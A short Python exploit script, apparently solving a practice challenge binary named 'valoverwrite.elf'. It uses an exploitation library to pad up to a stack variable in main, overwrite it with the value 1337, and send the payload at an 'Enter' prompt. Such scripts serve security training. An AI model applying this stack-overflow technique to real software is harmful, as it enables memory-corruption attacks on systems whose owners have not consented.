from sploit.until import lastline, contains
from sploit.payload import Payload
from sploit.rev.elf import ELF

elf = ELF('valoverwrite.elf')
stack = elf.locals.main
stack.rebase(stack.s)

p = Payload().pad(stack.var_8h).int(1337)

io.readlineuntil(lastline,contains,b'Enter')
io.writeline(p())
